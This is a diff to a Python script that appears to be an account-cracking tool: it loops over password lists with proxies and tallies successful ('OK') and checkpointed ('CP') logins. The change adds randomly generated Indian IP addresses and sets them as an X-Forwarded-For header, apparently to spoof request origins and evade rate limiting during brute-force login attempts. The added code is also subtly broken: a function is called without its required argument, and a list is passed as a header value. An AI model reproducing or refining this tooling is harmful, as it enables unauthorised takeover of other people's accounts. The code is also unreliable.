@@ -1,6 +1,6 @@
 #__________________| IMPORT |__________________#
 from os import path
-import requests,bs4,random,uuid,string,hashlib,json
+import requests,bs4,random,uuid,string,hashlib,json,socket
 from os import path
 from urllib.request import urlopen
 from bs4 import BeautifulSoup as sop
@@ -57,8 +57,31 @@ except Exception as e:
 	print('')
 proxies=open('proxies.txt','r').read().splitlines()
 
+def generate_random_ip():
+    # Indian public IP address ranges (some common ranges)
+    first_octet = random.choice([152])
+    second_octet = random.randint(56, 59)
+    third_octet = random.randint(130, 199)
+    fourth_octet = random.randint(130, 199)  # Avoid 0 and 255 for valid hosts
+    return f"{first_octet}.{second_octet}.{third_octet}.{fourth_octet}"
 
-xx=requests.get('https://raw.githubusercontent.com/BITHIKA-777/Nepalese/main/ua.txt').text.splitlines()
+def check_ip(ip):
+    try:
+        socket.inet_aton(ip)
+        return True
+    except socket.error:
+        return False
+
+def generate_working_ips(count):
+    working_ips = set()
+    while len(working_ips) < count:
+        ip = generate_random_ip()
+        if check_ip(ip):
+            working_ips.add(ip)
+    return list(working_ips)
+
+# Generate 10 valid random Indian IPs
+random_ips = generate_working_ips()
 
 import time
 from datetime import datetime
@@ -1301,6 +1324,7 @@ def rndm4(uid,passlist):
         global oks
         sys.stdout.write(f'\r\r{G}[{R}BITHIKA-M4{G}]{G} %s {G}|{G} OK{G}|{G}CP{G} %s{G}|{R}%s '%(loop,len(oks),len(cps)));sys.stdout.flush()
         session=requests.Session()
+        session.headers.update({'X-Forwarded-For': random_ips})
         au=Ugen()
         try:
                 for pas in passlist:
